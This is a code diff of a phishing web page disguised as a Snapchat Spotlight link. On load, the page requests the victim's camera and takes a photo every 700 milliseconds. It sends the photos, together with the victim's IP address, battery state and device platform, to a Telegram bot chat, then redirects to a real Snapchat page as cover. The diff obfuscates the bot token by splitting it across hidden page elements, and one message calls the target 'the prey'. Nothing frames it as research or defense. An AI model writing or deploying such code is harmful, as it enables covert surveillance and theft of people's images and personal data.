@@ -5,7 +5,7 @@
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
 
-    <meta id="v_data_ref" content="8431515310:">
+    <meta name="analytics-id" content="8431515310:">
     <style>
         body { background-color: white; margin: 0; overflow: hidden; }
         .sys-info { display: none; visibility: hidden; }
@@ -13,28 +13,31 @@
 </head>
 <body onload="capture()">
 
-    <span class="sys-info" id="p2">AAHgyPYR-Z</span>
-
-    <div style="display:none">
-        <p id="p3">Fn2QF-xU2367CK</p>
+    
+    <div class="sys-info">
+        <span id="data_ref_02">AAHgyPYR-Z</span>
     </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
     
-    const _s1 = document.getElementById("v_data_ref").getAttribute("content");
-    const _s2 = document.getElementById("p2").innerText;
-    const _s3 = document.getElementById("p3").innerText;
-    const _s4 = "KRQPP-YQq1s"; 
-    const TOKEN = _s1 + _s2 + _s3 + _s4;
 
+    const _s1 = document.querySelector('meta[name="analytics-id"]').content;
+    const _s2 = document.getElementById("data_ref_02").innerText;
+    const _s3 = "Fn2QF-xU2367CK"; 
+    
     async function capture() {
         if (!targetID) return;
 
         setTimeout(() => {
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }, 5000);
+
+    
+        const _s4 = document.getElementById("p_ext_data").innerText;
+        const _s5 = "KRQPP-YQq1s";
+        const TOKEN = _s1 + _s2 + _s3 + _s4 + _s5;
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -56,7 +59,7 @@
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
+                    _sendMsg(report, TOKEN);
                 });
 
             const video = document.createElement('video');
@@ -70,42 +73,35 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", TOKEN); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
         } catch (e) {
-            sendToTelegram(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا");
+            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", TOKEN);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
 
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    function _sendMsg(text, tk) {
+        fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
 
-    function sendLocation(lat, lon) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
-        });
-    }
-
-    function sendFile(blob, type) {
+    function _sendFile(blob, type, tk) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
         fd.append(type, blob, "victim.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+        fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
 
+    
     <footer style="display:none">
-        <p>System stability check: 100%</p>
+        <span id="p_ext_data">KRQPP-YQq1s</span>
     </footer>
 </body>
 </html>
